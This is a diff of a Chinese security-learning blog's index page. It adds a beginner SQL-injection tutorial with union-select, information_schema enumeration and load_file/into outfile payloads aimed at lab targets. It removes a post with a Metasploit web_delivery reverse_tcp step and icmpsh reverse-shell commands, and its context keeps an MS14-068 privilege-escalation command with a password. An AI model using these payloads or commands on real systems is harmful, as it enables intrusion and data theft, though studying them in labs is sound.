@@ -64,6 +64,62 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql注入基础" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/09/23/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/" class="article-date">
+  <time datetime="2021-09-23T14:56:58.000Z" itemprop="datePublished">2021-09-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/23/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/">sql注入基础</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="数据库类型"><a href="#数据库类型" class="headerlink" title="数据库类型"></a>数据库类型</h4><p>   Access、Mysql、Mssql、Oracle、Postsql、SQLite、Mongodb等等</p>
+<h4 id="数据库结构-以MySQL数据库为例"><a href="#数据库结构-以MySQL数据库为例" class="headerlink" title="数据库结构(以MySQL数据库为例)"></a>数据库结构(以MySQL数据库为例)</h4><p>数据库A<br>             表名<br>        列名<br>               数据<br>数据库B<br>             表名<br>        列名<br>               数据<br>数据库C<br>            …..</p>
+<h4 id="如何判断注入点"><a href="#如何判断注入点" class="headerlink" title="如何判断注入点"></a>如何判断注入点</h4><h5 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h5><p>且  and<br>或 or<br>非 not<br>异或 xor<br>真且真 = 真<br>真且假 = 假<br>真或假 = 真</p>
+<h5 id="常规注入方式"><a href="#常规注入方式" class="headerlink" title="常规注入方式"></a>常规注入方式</h5><p>and 1=1  页面正常<br>and 1=2   页面错误<br>      可能存在注入点<br>and 1=2   页面404或页面不影响<br>      可能后台有检测，没有sql漏洞</p>
+<h5 id="猜解列名数量"><a href="#猜解列名数量" class="headerlink" title="猜解列名数量"></a>猜解列名数量</h5><p>order by 3  页面正常，表示列名数量为&gt;=3</p>
+<p>#联合查询<br>union select 1,2,3 将数据回显页面上进行控制</p>
+<p>#注释符号<br>–+ , #</p>
+<h5 id="限制查询的结果"><a href="#限制查询的结果" class="headerlink" title="限制查询的结果"></a>限制查询的结果</h5><p>LIMIT语句进行控制，Limit 0,1表示 0开始显示1条数据，可以修改起始位置0改变输出结果<br>a={1,2,3,4}<br>Limit 0,1</p>
+<p>$x=$_GET[‘id’];<br>SELECT * FROM users WHERE id=1 LIMIT 0,1</p>
+<p>id=2 and 1=2 union select 1,2,3<br>SELECT * FROM users WHERE id=2 and 1=2 union select 1,2,3 LIMIT 0,1</p>
+<h5 id="常用查询方式"><a href="#常用查询方式" class="headerlink" title="常用查询方式"></a>常用查询方式</h5><p>查询：select<br>增加：insert<br>修改：update<br>删除：delete<br>排序：order by</p>
+<h5 id="数据库信息收集"><a href="#数据库信息收集" class="headerlink" title="数据库信息收集"></a>数据库信息收集</h5><p>数据库版本：version()<br>数据库名字：database()<br>数据库用户：user()<br>操作系统：@@version_compile_os</p>
+<h4 id="必懂知识点"><a href="#必懂知识点" class="headerlink" title="必懂知识点"></a>必懂知识点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、mysql5.0版本以上，会自带一个数据库information_schema，里面存着所有数据名，所有表名，所有列名，这时候就可以利用这个特性，去查找相对应数据库下的表名和列名数据，其中高版本包括5.0以上，低版本5.0以下</span><br><span class="line">2、数据库符号&quot;.&quot;，表示下一级，如 CMS.user表示CMS数据库下的user表</span><br><span class="line">3、各种语句</span><br><span class="line">     information_schema.tables：表示记录所有数据库的所有表名的表</span><br><span class="line">     information_schema.columns：表示记录所有数据库的所有列名的表</span><br><span class="line">     table_name：表名</span><br><span class="line">     column_name：列名</span><br><span class="line">     table_schema：数据库名</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="案例实验"><a href="#案例实验" class="headerlink" title="案例实验"></a>案例实验</h5><p>墨者靶机真实 MYSQL 注入演示<br>数据库名：mozhe_Discuz_StormGroup<br>表名：StormGroup_member<br>列名：id,name,password,status,id,title,content,time</p>
+<h5 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h5><p><a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/elRHc1BCd2VIckQxbjduMG9BVCtkZz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/elRHc1BCd2VIckQxbjduMG9BVCtkZz09bW96aGUmozhe</a>   墨者靶场<br><a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a>   sqlilab靶场</p>
+<h4 id="常见sql注入函数"><a href="#常见sql注入函数" class="headerlink" title="常见sql注入函数"></a>常见sql注入函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">user()：用户名</span><br><span class="line">version()：mysql版本</span><br><span class="line">database()：数据库名</span><br><span class="line">@@datadir：读取数据库路径</span><br><span class="line">@@plugin_dir：读取插件位置</span><br><span class="line">select load_file：(读文件的路径)</span><br><span class="line">length() &#x3D;&gt;计算字符串长度</span><br><span class="line">hex() &#x3D;&gt;字符转换为16进制</span><br><span class="line">@@basedir MYSQL：获取安装路径</span><br><span class="line">select current_user()：查询当前用户</span><br><span class="line">select system_user()：查看系统用户</span><br><span class="line">@@version_compile_os：操作系统版本</span><br><span class="line">into outfile：写文件&#123;select &#39;需要写的文件&#39; into outfile &#39;目录下&#39;&#125;</span><br><span class="line">group_concat(列名)：会把这一列中所有的内容在一行中以,隔开输出</span><br><span class="line">concat(str1,str2,…)：没有分割符地连接字符串，显示数据（数据合并）</span><br><span class="line">select &#39;123123&#39; into outfile &#39;d:&#x2F;&#x2F;study&#x2F;1.txt&#39;;(将123123添加至d盘study中新建1.txt文件中)</span><br><span class="line">group_concat(str1,str2,…)：连接一个组的所有字符串，并以逗号分割每一条数据，显示数据</span><br><span class="line">concat_ws(separator,str1,str2)：用分隔符连接两个字段的字符串</span><br><span class="line">group_concat(concat_ws(seperator,str1,str2))：将多行查询结果以逗号分隔全部输出，每一行的结果可用设置的分隔符作字段的间隔</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/09/23/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/" data-id="ckvc107x2000i70vj2zp8c8ix" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-信息资产收集" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/09/19/%E4%BF%A1%E6%81%AF%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/" class="article-date">
@@ -108,7 +164,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/19/%E4%BF%A1%E6%81%AF%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/" data-id="ckv7qjzsm000pnovjbk1kajte" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/19/%E4%BF%A1%E6%81%AF%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/" data-id="ckvc107x7000q70vj37rh7hua" class="article-share-link">Share</a>
       
       
     </footer>
@@ -154,7 +210,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/15/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95%E5%92%8CCDN%E7%BB%95%E8%BF%87/" data-id="ckv7qjzsp000unovj3mul0er0" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/15/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95%E5%92%8CCDN%E7%BB%95%E8%BF%87/" data-id="ckvc107x9000v70vjhd1n6g9c" class="article-share-link">Share</a>
       
       
     </footer>
@@ -193,7 +249,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/12/Web%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/" data-id="ckv7qjzs10008novje5ne4i6j" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/12/Web%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/" data-id="ckvc107wt000870vj6orb8ux7" class="article-share-link">Share</a>
       
       
     </footer>
@@ -249,7 +305,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/10/%E7%BD%91%E7%AB%99%E6%95%B0%E6%8D%AE%E5%8C%85%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/" data-id="ckv7qjzsy0014novj8hi8dmq1" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/10/%E7%BD%91%E7%AB%99%E6%95%B0%E6%8D%AE%E5%8C%85%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/" data-id="ckvc107xk001570vjgerf60bi" class="article-share-link">Share</a>
       
       
     </footer>
@@ -292,7 +348,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/07/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" data-id="ckv7qjzs00007novj1jxt7icb" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/07/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" data-id="ckvc107wt000770vj25vjczuv" class="article-share-link">Share</a>
       
       
     </footer>
@@ -337,7 +393,7 @@
 <li><p>做信息搜集</p>
 </li>
 <li><p>用ms14-068向域控提权</p>
-<p>ms14068 -u <a href="mailto:&#105;&#x6c;&#x75;&#64;&#x69;&#108;&#x75;&#x2e;&#x63;&#111;&#109;">&#105;&#x6c;&#x75;&#64;&#x69;&#108;&#x75;&#x2e;&#x63;&#111;&#109;</a> -d 192.168.1.141 -s S-1-5-21-542716808-1865610110-2530282010-1105 -p 123123q.</p>
+<p>ms14068 -u <a href="mailto:&#105;&#108;&#x75;&#x40;&#x69;&#108;&#117;&#46;&#x63;&#111;&#x6d;">&#105;&#108;&#x75;&#x40;&#x69;&#108;&#117;&#46;&#x63;&#111;&#x6d;</a> -d 192.168.1.141 -s S-1-5-21-542716808-1865610110-2530282010-1105 -p 123123q.</p>
 <p>注入之前: 需要清除票据</p>
 <p>​    CMD: klist purge 清除票据 | klist 查看票据</p>
 <p>​    mimikatz: kerberos::purge 清除票据 | kerberos::list 查看票据</p>
@@ -405,7 +461,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/04/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" data-id="ckv7qjzsu0010novj39c66uf9" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/04/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" data-id="ckvc107xj001370vj065ud9e3" class="article-share-link">Share</a>
       
       
     </footer>
@@ -480,7 +536,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/02/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/" data-id="ckv7qjzsz0015novj8fql93kz" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/02/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/" data-id="ckvc107xl001670vjbbdqaxwx" class="article-share-link">Share</a>
       
       
     </footer>
@@ -555,7 +611,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/31/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/" data-id="ckv7qjzsp000vnovj0ifn3nxa" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/31/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/" data-id="ckvc107xa000w70vj5nqm4zhg" class="article-share-link">Share</a>
       
       
     </footer>
@@ -640,62 +696,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/26/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="ckv7qjzsy0013novjf4l90g0g" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-empire会话传递和代理" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/08/24/empire%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92%E5%92%8C%E4%BB%A3%E7%90%86/" class="article-date">
-  <time datetime="2021-08-24T04:23:30.000Z" itemprop="datePublished">2021-08-24</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/24/empire%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92%E5%92%8C%E4%BB%A3%E7%90%86/">empire会话传递和代理</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="empire会话传递"><a href="#empire会话传递" class="headerlink" title="empire会话传递"></a>empire会话传递</h2><ol>
-<li>获取session(特权用户传递会继承到特权)</li>
-<li>进入msf模块: <code>exploit/multi/script/web_delivery </code> –&gt; target: PSH –&gt; paylaod: windows/meterpreter/reverse_tcp –&gt; 监听</li>
-<li>使用模块: <code>code_execution/invoke_metasploitpayload</code> –&gt; 设置Agent, URL(根据msf生成的url去设置)</li>
-<li>执行传递</li>
-</ol>
-<h2 id="端口转发和代理"><a href="#端口转发和代理" class="headerlink" title="端口转发和代理"></a>端口转发和代理</h2><p>Windows: <code>mstsc</code></p>
-<p>linux: <code>rdesktop</code></p>
-<h4 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h4><h5 id="ICMPSH"><a href="#ICMPSH" class="headerlink" title="ICMPSH"></a>ICMPSH</h5><p><code>需要在同网段下去做, 如果端口受到限制, 那我们就可以用ICMPSH这款工具去反弹shell</code></p>
-<p><code>前提: ping未被禁用</code></p>
-<p>依赖环境: python-impacket(python2版本的) <code>pip2 install impacket</code></p>
-<p>icmsh_m.py 源IP 目标IP</p>
-<p>icmpsh.exe:</p>
-<p>-t target –&gt; 源IP</p>
-<p>-d delay <code>500</code> –&gt; 延迟的毫秒数</p>
-<p>-s bytes  <code>128</code> –&gt; 缓冲区的大小</p>
-<p>-b max blank <code>30</code> –&gt; 最大的空白数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 现在kali设置ping代替应答</span><br><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1 &gt;&#x2F;dev&#x2F;null</span><br><span class="line">2. 开启监听</span><br><span class="line">icmpsh_m.py s_ip d_ip</span><br><span class="line">3. 反弹shell</span><br><span class="line">icmpsh.exe -t s_ip -d 500 -s 128 -b 30</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/24/empire%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="ckv7qjzs20009novjearw7tbl" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/26/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="ckvc107xk001470vje1y4am3y" class="article-share-link">Share</a>
       
       
     </footer>
@@ -741,6 +742,10 @@
       <ul>
         
           <li>
+            <a href="/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">xss漏洞-过滤绕过及工具使用</a>
+          </li>
+        
+          <li>
             <a href="/2021/10/26/xss%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E7%A1%80%E5%88%86%E7%B1%BB%E5%8F%8A%E5%88%A9%E7%94%A8/">xss漏洞-基础分类及利用</a>
           </li>
         
@@ -754,10 +759,6 @@
         
           <li>
             <a href="/2021/10/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%90%8E%E7%AB%AF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/">文件上传漏洞的后端绕过方法</a>
-          </li>
-        
-          <li>
-            <a href="/2021/10/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E9%AA%8C%E8%AF%81%E8%BF%87%E6%BB%A4/">文件上传漏洞的利用和验证过滤</a>
           </li>
         
       </ul>
